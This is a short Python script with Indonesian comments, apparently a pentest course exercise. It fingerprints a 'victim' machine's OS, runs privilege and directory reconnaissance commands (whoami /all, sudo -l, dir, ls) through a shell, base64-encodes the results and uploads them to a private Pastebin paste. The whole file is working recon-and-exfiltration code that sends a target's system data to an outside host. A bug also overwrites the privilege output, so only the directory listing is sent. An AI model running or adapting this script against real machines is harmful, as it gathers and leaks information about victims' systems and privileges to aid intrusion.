import base64
import requests
import sys
from platform import system, platform
from subprocess import PIPE, Popen

API_KEY = "APIKEY"
API_URL = "https://pastebin.com/api/api_post.php"

#API key dan url untuk mengupload hasil outputnya.

msg = "Recon Result\n"
msg += f"Victim's OS: {platform()}\n"

#msg diatas digunakan untuk mencetak os korban. 
#Selanjutnya, akan divalidasi apabila korban memiliki os windows atau linux
#Dari keduanya, akan dijalankan command untuk mengetahui apakah root/admin dan menampilkan directory yang ada. 


if system() == "Windows":
    
    process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, error = process.communicate() 

    
    process = Popen("dir", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
    result, error = process.communicate() 


elif system() == "Linux":
    
    process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True) 
    result, error = process.communicate() 

    #proses untuk mengetahui directory yang ada pada komputer korban
    process = Popen("ls", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
    result, error = process.communicate() 
    
else: 
    sys.exit()

print(msg)
print(result)

if result == b'': 
    sys.exit(0)
else: 
    msg += result.decode()


msg = base64.b64encode(msg.encode())
print (f"Encoded Result :{msg}\n")

#hasil akan diencode dengan b64 sesuai dengan permintaan soal.

data = {
    'api_dev_key': API_KEY, #API KEY
    'api_option': 'paste', 
    'api_paste_private': 1, 
    'api_paste_name' : "GLSProgPentest_Pastebin", 
    'api_paste_code': msg 
}

respond = requests.post(url=API_URL, data=data)
pastebin_url = respond.text

#Akan menampilkan error output ataupun hasil akhir apabila berhasil diupload atau tidak. 

if respond.status_code == 200:
    print(f"Response Code :{respond.status_code}")
    print("SUCCESS")
    print(f"Pastebin URL: {respond.text}")


elif respond.status_code != 200:
    print(f"Response Code :{respond.status_code}")
    print("FAILED")
    print(f"Error: {respond.text}")
